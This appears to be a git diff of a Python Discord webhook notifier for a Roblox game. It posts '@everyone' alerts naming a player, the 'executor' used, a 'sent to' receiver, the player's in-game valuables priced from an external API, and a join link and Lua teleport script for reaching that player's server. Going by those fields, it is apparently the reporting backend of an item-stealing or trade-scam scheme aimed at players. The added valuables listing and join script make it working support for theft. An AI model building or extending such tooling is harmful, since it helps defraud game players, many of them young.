@@ -1,5 +1,6 @@
 from __future__ import annotations
 import re
+import time
 from datetime import datetime
 from typing import Optional
 import requests
@@ -12,6 +13,50 @@ COLOR_STARTING = 0xFEE75C
 COLOR_INGAME   = 0x57F287
 COLOR_LEFT     = 0xED4245
 
+_valuables_cache: dict[str, dict] = {}
+_valuables_fetched_at: float = 0
+_VALUABLES_TTL = 300
+
+def _get_valuables() -> dict[str, dict]:
+    global _valuables_cache, _valuables_fetched_at
+    now = time.time()
+    if _valuables_cache and now - _valuables_fetched_at < _VALUABLES_TTL:
+        return _valuables_cache
+    try:
+        resp = requests.get(
+            "https://api.project-reverse.org/valuables/get-game-valuables?game=gag2",
+            timeout=5,
+        )
+        if resp.status_code == 200:
+            data = resp.json().get("data", [])
+            _valuables_cache = {
+                item["name"]: {"emoji": item.get("emoji", ""), "price": item.get("price", 0)}
+                for item in data
+            }
+            _valuables_fetched_at = now
+            logger.info("Valuables cache refreshed (%d items)", len(_valuables_cache))
+    except Exception as exc:
+        logger.warning("Failed to fetch valuables: %s", exc)
+    return _valuables_cache
+
+
+def _build_items_field(items: dict[str, int], valuables: dict[str, dict]) -> str:
+    """
+    items: {"Sakura": 4, "Raccoon": 2, ...}
+    Only include items that exist in the valuables API.
+    Format: emoji name [owned] ($price)
+    """
+    lines = []
+    for name, owned in items.items():
+        info = valuables.get(name)
+        if info is None:
+            continue
+        emoji = info["emoji"]
+        price = info["price"]
+        price_str = f"${price:,.2f}" if price else "$0.00"
+        lines.append(f"{emoji} {name} [x{owned}] ({price_str})")
+    return "```\n" + "\n".join(lines) + "\n```" if lines else "```\nNo valuables found\n```"
+
 
 def _parse_webhook_url(url: str) -> tuple[str, str]:
     match = re.search(r"/webhooks/(\d+)/([\w-]+)", url)
@@ -22,15 +67,18 @@ def _parse_webhook_url(url: str) -> tuple[str, str]:
 
 def _build_embed(session: Session, color: int) -> dict:
     status_label = {
-        "starting": "🟡 Starting",
-        "ingame":   "🟢 In Game",
-        "left":     "🔴 Left",
-    }.get(session.current_status, "⚪ Unknown")
+        "starting": "🔵 starting",
+        "ingame":   "🟡 in-game",
+        "left":     "🔴 left",
+    }.get(session.current_status, "⚪ unknown")
 
     join_url = (
         f"https://plsbrainrot.me/joiner"
         f"?placeId={session.placeid}&gameInstanceId={session.jobid}"
     )
+
+    valuables = _get_valuables()
+    items_value = _build_items_field(session.items, valuables)
 
     return {
         "title": f"{session.username} | {session.jobid}",
@@ -43,21 +91,33 @@ def _build_embed(session: Session, color: int) -> dict:
                     f"👤 username: {session.username}\n"
                     f"🖥️ display:  {session.display}\n"
                     f"🎮 executor: {session.executor}\n"
-                    f"📬 receiver: {session.receiver}\n"
+                    f"📬 sent to:  {session.receiver}\n"
                     f"```"
                 ),
             },
-            {"name": "# **join link**", "value": f"[Click Me To Join]({join_url})"},
-            {"name": "# **status**",    "value": f"```\n{status_label}\n```"},
-            {"name": "# **first seen**","value": f"```\n{session.first_seen.isoformat()}\n```"},
-            {"name": "# **last heartbeat**", "value": f"```\n{session.last_seen.isoformat()}\n```"},
-            {"name": "# **uptime**",    "value": f"```\n{session.uptime}\n```"},
+            {
+                "name": "# **join link**",
+                "value": f"[Click Me To Join]({join_url})",
+            },
+            {
+                "name": "# **status**",
+                "value": (
+                    f"```\n"
+                    f"⏲️ up time: {session.uptime}\n"
+                    f"⚡ status:  {status_label}\n"
+                    f"```"
+                ),
+            },
+            {
+                "name": "# user's valuables",
+                "value": items_value,
+            },
             {
                 "name": "# **join script**",
                 "value": (
-                    f"```lua\n"
+                    f"```\n"
                     f'game:GetService("TeleportService"):'
-                    f'TeleportToPlaceInstance({session.placeid},"{session.jobid}")\n'
+                    f'TeleportToPlaceInstance({session.placeid}, "{session.jobid}")\n'
                     f"```"
                 ),
             },
@@ -80,10 +140,8 @@ def _send_request(method: str, url: str, payload: dict) -> Optional[requests.Res
 
 
 def post_message(session: Session, webhook_url: str) -> Optional[str]:
-    """POST a new embed. webhook_url comes from Supabase — never from client."""
     embed = _build_embed(session, COLOR_STARTING)
     payload = {"content": "@everyone", "embeds": [embed]}
-    # ?wait=true makes Discord return the message object so we get the ID
     resp = _send_request("POST", webhook_url + "?wait=true", payload)
     if resp is None:
         return None
@@ -100,7 +158,6 @@ def post_message(session: Session, webhook_url: str) -> Optional[str]:
 
 
 def patch_message(session: Session, color: int, webhook_url: str) -> bool:
-    """PATCH an existing embed. Falls back to POST if message was deleted."""
     if not session.discord_message_id:
         logger.warning("No message_id for jobid=%s — falling back to POST", session.jobid)
         new_id = post_message(session, webhook_url)
